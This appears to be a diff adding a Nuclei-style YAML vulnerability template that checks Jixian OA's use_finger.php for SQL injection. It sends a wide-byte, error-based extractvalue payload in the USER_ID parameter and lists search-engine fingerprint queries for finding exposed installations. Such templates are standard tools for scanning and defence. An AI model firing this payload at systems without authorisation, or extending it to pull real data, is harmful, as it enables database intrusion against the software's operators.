@@ -1,0 +1,33 @@
+id: jixian-oa-use_finger-sqli
+info:
+  name: 极限 OA use_finger.php - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-jixian-OA-use_finger.php-sqli.yml
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="1967132225" || body="/images/sohuu.ico"
+    hunter-query: web.icon=="d8028456021988373d7eca8b7ec28f09"
+    quake-query: app:"极限OA办公系统"
+    zoomeye-query: title:"GSD 网络智能办公系统"
+    threatbook-query: body="/images/sohuu.ico"
+    tips:
+    repair:
+    sqlmap: 
+  tags: jixian,oa,sqli
+
+http:
+  - raw:
+      - |
+        GET /inc/finger/use_finger.php?USER_ID=-1%df%27and%20extractvalue(1,%20concat(0x5c,(select%20MD5(520))))%23 HTTP/1.1
+        Host: {{Hostname}}
+      
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'XPATH syntax','cf67355a3333e6e143439161adc2')
+        condition: and
